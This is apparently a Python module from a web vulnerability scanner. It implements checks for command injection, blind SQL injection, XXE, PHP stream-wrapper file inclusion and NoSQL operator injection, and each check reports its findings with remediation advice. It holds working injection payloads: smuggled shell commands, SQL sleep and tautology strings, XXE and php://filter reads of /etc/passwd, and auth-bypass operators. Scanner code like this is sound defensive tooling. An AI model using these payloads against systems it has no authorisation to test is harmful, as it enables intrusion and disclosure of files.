from __future__ import annotations

import base64
import re
from html import escape
from urllib.parse import parse_qsl, urlsplit

from ..models import Confidence, Finding, Profile, ScanContext, Severity, TargetKind
from ..registry import Check, register
from .web_active import (
    _AGGRESSIVE_CRAWL_CAP,
    _PASSWD_SIGNATURE,
    _SAFE_CRAWL_CAP,
    _WIN_INI_SIGNATURE,
    _discover,
    _set_param,
)
from .web_injection import _stable


def _cap(ctx: ScanContext) -> int:
    return _AGGRESSIVE_CRAWL_CAP if ctx.profile is Profile.AGGRESSIVE else _SAFE_CRAWL_CAP


def _param_value(url: str, param: str) -> str:
    try:
        pairs = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    except ValueError:
        return ""
    for key, val in pairs:
        if key == param:
            return val
    return ""


def _length_differential(probe, baseline) -> bool:
    """True when the two bodies differ by more than page-to-page noise."""
    plen = len(probe.text or "")
    blen = len(baseline.text or "")
    return abs(plen - blen) > max(200, int(0.30 * max(blen, 1)))


def _materially_different(probe, baseline) -> bool:
    """True when probe diverges from baseline in a way a benign value would not."""
    if probe is None or baseline is None:
        return False
    if probe.status_code != baseline.status_code and probe.status_code < 500:
        return True
    return _length_differential(probe, baseline)


def _time_confirm(ctx: ScanContext, url: str, param: str, payload_values, control_value, threshold):
    """Return the delaying payload when two independent trials both exceed control+threshold."""
    control = ctx.http.get(_set_param(url, param, control_value))
    if control is None:
        return None
    base_elapsed = control.elapsed.total_seconds()
    for value in payload_values:
        confirmed = True
        for _ in range(2):
            resp = ctx.http.get(_set_param(url, param, value))
            if resp is None or resp.elapsed.total_seconds() <= base_elapsed + threshold:
                confirmed = False
                break
        if confirmed:
            return value
    return None


def _b64_decode(run: str):
    pad = (-len(run)) % 4
    try:
        return base64.b64decode(run + "=" * pad)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# web.command_injection
# ---------------------------------------------------------------------------

_CMD_FACTOR_PAIRS = [(7919, 6271), (4133, 8017)]
_CMD_SEPARATORS = [
    ";expr N1 \\* N2",
    "|expr N1 \\* N2",
    "$(expr N1 \\* N2)",
    "`expr N1 \\* N2`",
    "&& expr N1 \\* N2",
    ";echo $((N1*N2))",
    "& set /a N1*N2",
]
_CMD_TIME_PAYLOADS = [";sleep 6", "`sleep 6`", "& ping -n 6 127.0.0.1"]


@register
class CommandInjection(Check):
    name = "web.command_injection"
    title = "OS command injection"
    target_kinds = (TargetKind.WEB,)
    min_profile = Profile.AGGRESSIVE

    def run(self, ctx: ScanContext):
        emitted = 0
        seen: set = set()
        time_budget = 2
        for url, params in _discover(ctx, _cap(ctx), set()):
            for param in params:
                if not param or emitted >= 5:
                    continue
                location = f"{url} [param: {param}]"
                if location in seen:
                    continue
                orig = _param_value(url, param) or "1"
                baseline = ctx.http.get(_set_param(url, param, orig))
                if baseline is None:
                    continue
                baseline_body = baseline.text or ""
                products = [str(n1 * n2) for n1, n2 in _CMD_FACTOR_PAIRS]
                if any(product in baseline_body for product in products):
                    continue

                sample = self._output_oracle(ctx, url, param, orig, products, baseline_body)
                if sample is not None:
                    seen.add(location)
                    emitted += 1
                    yield self._finding(
                        param, location, sample, products, Confidence.HIGH,
                        "arithmetic output oracle (both factor pairs evaluated, no reflection)",
                    )
                    continue

                if ctx.profile is Profile.AGGRESSIVE and time_budget > 0:
                    time_budget -= 1
                    values = [orig + p for p in _CMD_TIME_PAYLOADS]
                    delayer = _time_confirm(ctx, url, param, values, orig, 5.0)
                    if delayer is not None:
                        seen.add(location)
                        emitted += 1
                        yield self._finding(
                            param, location, delayer, products, Confidence.MEDIUM,
                            "time-delay oracle (two trials exceeded baseline+5s)",
                        )

    def _output_oracle(self, ctx, url, param, orig, products, baseline_body):
        for sep in _CMD_SEPARATORS:
            confirmed = True
            for (n1, n2), product in zip(_CMD_FACTOR_PAIRS, products):
                rendered = sep.replace("N1", str(n1)).replace("N2", str(n2))
                resp = ctx.http.get(_set_param(url, param, orig + rendered))
                if resp is None:
                    confirmed = False
                    break
                body = resp.text or ""
                if product not in body or rendered in body or product in baseline_body:
                    confirmed = False
                    break
            if confirmed:
                n1, n2 = _CMD_FACTOR_PAIRS[0]
                return sep.replace("N1", str(n1)).replace("N2", str(n2))
        return None

    def _finding(self, param, location, payload, products, confidence, method):
        return Finding(
            check=self.name,
            title=f"OS command injection via parameter '{param}'",
            severity=Severity.CRITICAL,
            confidence=confidence,
            category="A03:2021 Injection",
            cwe="CWE-78",
            description=(
                f"A shell metacharacter payload injected into parameter '{param}' caused the "
                "server to execute an operating-system command. Two independent arithmetic "
                f"factor pairs each produced their product ({products[0]} and {products[1]}) in "
                "the response while the literal payload text did not appear, which distinguishes "
                "server-side command execution from mere reflection."
            ),
            remediation=(
                "Never pass user input to a shell. Use argument-array APIs that bypass the shell "
                "(for example subprocess with a list and shell=False), validate against a strict "
                "allowlist, and drop shell metacharacters."
            ),
            location=location,
            evidence=f"{method}; payload: {escape(payload)}",
            references=[
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://cwe.mitre.org/data/definitions/78.html",
            ],
        )


# ---------------------------------------------------------------------------
# web.blind_sql_injection
# ---------------------------------------------------------------------------

_SQL_SYNTAXES = [
    ("numeric", " AND 1=1", " AND 1=2", " AND 4=4", " AND 4=5"),
    ("single-quote", "' AND '1'='1", "' AND '1'='2", "' AND '4'='4", "' AND '4'='5"),
    ("double-quote", '" AND "1"="1', '" AND "1"="2', '" AND "4"="4', '" AND "4"="5'),
]
_SQL_TIME_PAYLOADS = ["' AND SLEEP(5)-- -", " AND pg_sleep(5)--", "'; WAITFOR DELAY '0:0:5'--"]
_SQL_TIME_CONTROL = "' AND SLEEP(0)-- -"
_SQL_SKIP_PARAMS = {"page", "limit", "offset", "size"}


@register
class BlindSqlInjection(Check):
    name = "web.blind_sql_injection"
    title = "Blind SQL injection (boolean/time based)"
    target_kinds = (TargetKind.WEB,)
    min_profile = Profile.SAFE

    def run(self, ctx: ScanContext):
        emitted = 0
        seen: set = set()
        time_budget = 2
        for url, params in _discover(ctx, _cap(ctx), set()):
            for param in params:
                if not param or emitted >= 5 or param.lower() in _SQL_SKIP_PARAMS:
                    continue
                location = f"{url} [param: {param}]"
                if location in seen:
                    continue
                orig = _param_value(url, param) or "1"
                b1 = ctx.http.get(_set_param(url, param, orig))
                b2 = ctx.http.get(_set_param(url, param, orig))
                if not _stable(b1, b2):
                    continue

                boolean = self._boolean_oracle(ctx, url, param, orig, b1)
                if boolean is not None:
                    confidence, label = boolean
                    seen.add(location)
                    emitted += 1
                    yield self._finding(param, location, confidence, "boolean-based", label)
                    continue

                if ctx.profile is Profile.AGGRESSIVE and time_budget > 0:
                    time_budget -= 1
                    values = [orig + p for p in _SQL_TIME_PAYLOADS]
                    delayer = _time_confirm(ctx, url, param, values, orig + _SQL_TIME_CONTROL, 4.5)
                    if delayer is not None:
                        seen.add(location)
                        emitted += 1
                        yield self._finding(
                            param, location, Confidence.MEDIUM, "time-based",
                            "two trials exceeded a SLEEP(0) control by more than 4.5s",
                        )

    def _boolean_oracle(self, ctx, url, param, orig, baseline):
        for label, true1, false1, true2, false2 in _SQL_SYNTAXES:
            rt1 = ctx.http.get(_set_param(url, param, orig + true1))
            rf1 = ctx.http.get(_set_param(url, param, orig + false1))
            if not (_stable(rt1, baseline) and _materially_different(rf1, baseline)):
                continue
            rt2 = ctx.http.get(_set_param(url, param, orig + true2))
            rf2 = ctx.http.get(_set_param(url, param, orig + false2))
            second = _stable(rt2, baseline) and _materially_different(rf2, baseline)
            detail = f"{label} tautologies: TRUE matched baseline, FALSE diverged"
            if second:
                detail += " (two independent pairs agreed)"
            return (Confidence.HIGH if second else Confidence.MEDIUM, detail)
        return None

    def _finding(self, param, location, confidence, technique, detail):
        return Finding(
            check=self.name,
            title=f"Blind SQL injection via parameter '{param}'",
            severity=Severity.CRITICAL,
            confidence=confidence,
            category="A03:2021 Injection",
            cwe="CWE-89",
            description=(
                f"Parameter '{param}' is vulnerable to {technique} blind SQL injection. The "
                "endpoint returns a generic page with no database error text, so the injection "
                "was confirmed behaviourally rather than by an error signature: a truth-value "
                "oracle changed the response exactly as SQL boolean logic predicts."
            ),
            remediation=(
                "Use parameterized queries or prepared statements for every query and never build "
                "SQL by string concatenation. Apply least-privilege database accounts as "
                "defence in depth."
            ),
            location=location,
            evidence=detail,
            references=[
                "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
            ],
        )


# ---------------------------------------------------------------------------
# web.xxe_injection
# ---------------------------------------------------------------------------

_XXE_STEP1 = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "{m}">]><r>&e;</r>'
_XXE_PASSWD = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>'
)
_XXE_WININI = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><r>&e;</r>'
)
_XXE_CONTENT_TYPES = ["application/xml", "text/xml", "application/soap+xml"]


@register
class XxeInjection(Check):
    name = "web.xxe_injection"
    title = "XML External Entity (in-band file disclosure)"
    target_kinds = (TargetKind.WEB,)
    min_profile = Profile.AGGRESSIVE

    def run(self, ctx: ScanContext):
        emitted = 0
        seen: set = set()
        for url in self._candidates(ctx):
            if emitted >= 3 or url in seen:
                continue
            seen.add(url)
            result = self._probe(ctx, url)
            if result is None:
                continue
            content_type, disclosed = result
            emitted += 1
            yield Finding(
                check=self.name,
                title="XML External Entity injection (in-band file read)",
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category="A05:2021 Security Misconfiguration",
                cwe="CWE-611",
                description=(
                    "This endpoint parses attacker-supplied XML and resolves external SYSTEM "
                    "entities. A benign internal entity was echoed first (proving the parser "
                    f"expands entities), then a SYSTEM entity read a local file ({disclosed}) "
                    "whose signature appeared in the response but was absent from the benign "
                    "baseline, confirming XXE."
                ),
                remediation=(
                    "Disable DTD processing and external entity resolution in the XML parser "
                    "(set FEATURE_SECURE_PROCESSING, disallow-doctype-decl, and disable external "
                    "general/parameter entities), or use a hardened library such as defusedxml."
                ),
                location=url,
                evidence=f"content-type {content_type}; disclosed {disclosed}",
                references=[
                    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    "https://cwe.mitre.org/data/definitions/611.html",
                ],
            )

    def _candidates(self, ctx):
        out = []
        seen = set()
        base = ctx.target.base_url()
        seeds = [base, base.rstrip("/") + "/api"] if base else []
        for seed in seeds:
            if seed not in seen:
                seen.add(seed)
                out.append(seed)
        for url, _ in _discover(ctx, _cap(ctx), set()):
            if url in seen:
                continue
            seen.add(url)
            out.append(url)
            if len(out) >= 6:
                break
        return out[:6]

    def _probe(self, ctx, url):
        for content_type in _XXE_CONTENT_TYPES:
            marker = ctx.http.marker()
            headers = {"Content-Type": content_type}
            r1 = ctx.http.post(url, data=_XXE_STEP1.format(m=marker), headers=headers)
            if r1 is None:
                continue
            baseline = r1.text or ""
            if marker not in baseline:
                continue
            for payload, signature, disclosed in (
                (_XXE_PASSWD, _PASSWD_SIGNATURE, "file:///etc/passwd"),
                (_XXE_WININI, _WIN_INI_SIGNATURE, "file:///c:/windows/win.ini"),
            ):
                if signature.search(baseline):
                    continue
                r2 = ctx.http.post(url, data=payload, headers=headers)
                if r2 is None:
                    continue
                if signature.search(r2.text or ""):
                    return (content_type, disclosed)
            return None
        return None


# ---------------------------------------------------------------------------
# web.lfi_wrappers
# ---------------------------------------------------------------------------

_LFI_NAMES = {
    "file", "page", "path", "template", "include", "doc", "view", "lang", "module", "action",
}
_LFI_EXT = re.compile(r"\.[A-Za-z0-9]{1,5}$")
_B64_RUN = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")


@register
class LfiWrappers(Check):
    name = "web.lfi_wrappers"
    title = "Local file inclusion via stream wrappers"
    target_kinds = (TargetKind.WEB,)
    min_profile = Profile.AGGRESSIVE

    def run(self, ctx: ScanContext):
        emitted = 0
        seen: set = set()
        for url, params in _discover(ctx, _cap(ctx), set()):
            for param in params:
                if not param or emitted >= 5:
                    continue
                orig = _param_value(url, param)
                if param.lower() not in _LFI_NAMES and not _LFI_EXT.search(orig):
                    continue
                location = f"{url} [param: {param}]"
                if location in seen:
                    continue
                baseline = ctx.http.get(_set_param(url, param, orig or "index"))
                baseline_body = baseline.text or "" if baseline is not None else ""

                hit = self._filter_oracle(ctx, url, param, orig, baseline_body)
                if hit is None:
                    hit = self._data_oracle(ctx, url, param, baseline_body)
                if hit is not None:
                    confidence, payload, detail = hit
                    seen.add(location)
                    emitted += 1
                    yield Finding(
                        check=self.name,
                        title=f"Local file inclusion via parameter '{param}'",
                        severity=Severity.HIGH,
                        confidence=confidence,
                        category="A03:2021 Injection",
                        cwe="CWE-98",
                        description=(
                            f"Parameter '{param}' feeds a file-include path that honours language "
                            "stream wrappers. A php://filter or data:// wrapper turned the include "
                            "into source-code or content disclosure, which a plain directory "
                            "traversal probe would never reach."
                        ),
                        remediation=(
                            "Never build include or file paths from user input. Disable remote and "
                            "wrapper-based includes (allow_url_include=Off), map requests to a "
                            "fixed allowlist of files, and canonicalize any remaining path."
                        ),
                        location=location,
                        evidence=f"{detail}; payload: {escape(payload)}",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://cwe.mitre.org/data/definitions/98.html",
                        ],
                    )

    def _filter_oracle(self, ctx, url, param, orig, baseline_body):
        wrappers = [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]
        if orig:
            wrappers.append("php://filter/convert.base64-encode/resource=" + orig)
        for wrapper in wrappers:
            resp = ctx.http.get(_set_param(url, param, wrapper))
            if resp is None:
                continue
            body = resp.text or ""
            for run in _B64_RUN.findall(body):
                if run in baseline_body:
                    continue
                decoded = _b64_decode(run)
                if decoded is None:
                    continue
                text = decoded.decode("latin-1", "ignore")
                if "<?php" in text or _PASSWD_SIGNATURE.search(text):
                    return (Confidence.HIGH, wrapper, "base64 stream decoded to source/passwd")
        return None

    def _data_oracle(self, ctx, url, param, baseline_body):
        marker = ctx.http.marker()
        payload = "data://text/plain," + marker
        resp = ctx.http.get(_set_param(url, param, payload))
        if resp is None:
            return None
        body = resp.text or ""
        if marker in body and "data://" not in body and marker not in baseline_body:
            return (Confidence.MEDIUM, payload, "data:// wrapper content executed and echoed")
        return None


# ---------------------------------------------------------------------------
# web.json_nosql_operators
# ---------------------------------------------------------------------------

_JSON_OPS = [("$ne", None), ("$gt", ""), ("$regex", ".*")]
_JSON_AUTH_HINTS = ("login", "auth", "signin", "session", "token")
_JSON_IDENTITY_FIELDS = ("username", "user", "email", "login", "name", "id", "q", "query")


def _order_fields(fields):
    """Deterministic probe order: identity-style names first, then alphabetical.

    Field names arrive as a set, so without an explicit order the probed field (and
    therefore whether the check fires at all) would vary run to run.
    """
    names = sorted(f for f in fields if f)
    names.sort(key=lambda n: n.lower() not in _JSON_IDENTITY_FIELDS)
    return names


def _outcome_rank(status: int) -> int:
    """0 success, 1 redirect, 2 client rejection. Lower means closer to a served request."""
    if status < 300:
        return 0
    if status < 400:
        return 1
    return 2


def _operator_signal(resp, baseline):
    """Classify an operator variant against the scalar baseline.

    Returns ``(toward_success, detail)`` or ``None``. A bare status change is not evidence
    of injection: an API that validates types answers the object with 400/422 *instead of*
    running the query, which is the secure behaviour. Only a response that moves toward the
    success shape, or one that keeps the baseline status while returning a materially
    different body, is treated as a hit.
    """
    if resp is None or baseline is None or resp.status_code >= 500:
        return None
    if resp.status_code != baseline.status_code:
        if _outcome_rank(resp.status_code) < _outcome_rank(baseline.status_code):
            detail = f"status {baseline.status_code} -> {resp.status_code} (toward success)"
            return (True, detail)
        return None
    if _length_differential(resp, baseline):
        detail = (
            f"status {resp.status_code} unchanged, body "
            f"{len(baseline.text or '')}b -> {len(resp.text or '')}b"
        )
        return (False, detail)
    return None


@register
class JsonNoSqlOperators(Check):
    name = "web.json_nosql_operators"
    title = "NoSQL operator injection in JSON bodies"
    target_kinds = (TargetKind.WEB,)
    min_profile = Profile.AGGRESSIVE

    def run(self, ctx: ScanContext):
        emitted = 0
        seen: set = set()
        for url, fields in self._endpoints(ctx):
            if emitted >= 4 or url in seen:
                continue
            names = _order_fields(fields) or ["username", "password"]
            marker = ctx.http.marker()
            scalar = {name: marker for name in names}
            b1 = ctx.http.post(url, json=scalar)
            b2 = ctx.http.post(url, json=scalar)
            if b1 is None or b2 is None or b1.status_code >= 500 or not _stable(b1, b2):
                continue
            hit = self._probe_ops(ctx, url, scalar, names[0], marker, b1)
            if hit is None:
                continue
            operator, response, flipped, confidence, detail = hit
            seen.add(url)
            emitted += 1
            yield Finding(
                check=self.name,
                title=f"NoSQL operator injection at '{url}'",
                severity=Severity.HIGH,
                confidence=confidence,
                category="A03:2021 Injection",
                cwe="CWE-943",
                description=(
                    f"Replacing the '{names[0]}' scalar in a JSON request body with a MongoDB-style "
                    f"operator ({operator}) changed the response relative to a stable scalar "
                    "baseline sent twice, without the endpoint rejecting the object as a type "
                    "error and without echoing the operator token. This indicates the JSON value "
                    "reaches a NoSQL query as an operator."
                    + (" The response flipped an authentication endpoint from failure to success "
                       "shape, indicating an auth bypass." if flipped else "")
                    + (" Only the response body changed, so confirm manually before acting."
                       if confidence is Confidence.LOW else "")
                ),
                remediation=(
                    "Reject JSON values that are objects where scalars are expected, cast inputs to "
                    "the intended type before querying, and use an ODM or query builder that "
                    "disallows operator injection."
                ),
                location=url,
                evidence=(
                    f"baseline {b1.status_code}/{len(b1.text or '')}b vs {operator} "
                    f"{response.status_code}/{len(response.text or '')}b; {detail}"
                ),
                references=[
                    "https://portswigger.net/web-security/nosql-injection",
                    "https://cwe.mitre.org/data/definitions/943.html",
                ],
            )

    def _endpoints(self, ctx):
        out = []
        seen = set()
        base = ctx.target.base_url()
        if base:
            api = base.rstrip("/") + "/api"
            seen.add(api)
            out.append((api, set()))
        for url, params in _discover(ctx, _cap(ctx), set()):
            if url in seen:
                continue
            seen.add(url)
            out.append((url, set(params)))
            if len(out) >= 12:
                break
        return out

    def _probe_ops(self, ctx, url, scalar, target, marker, baseline):
        try:
            path = urlsplit(url).path.lower()
        except ValueError:
            path = ""
        auth = any(hint in path for hint in _JSON_AUTH_HINTS)
        for operator, raw in _JSON_OPS:
            variant = dict(scalar)
            variant[target] = {operator: marker if raw is None else raw}
            resp = ctx.http.post(url, json=variant)
            if resp is None:
                continue
            if operator in (resp.text or ""):
                continue
            signal = _operator_signal(resp, baseline)
            if signal is None:
                continue
            toward_success, detail = signal
            flipped = auth and toward_success and baseline.status_code >= 400
            if flipped:
                confidence = Confidence.HIGH
            elif toward_success:
                confidence = Confidence.MEDIUM
            else:
                confidence = Confidence.LOW
            return (operator, resp, flipped, confidence, detail)
        return None
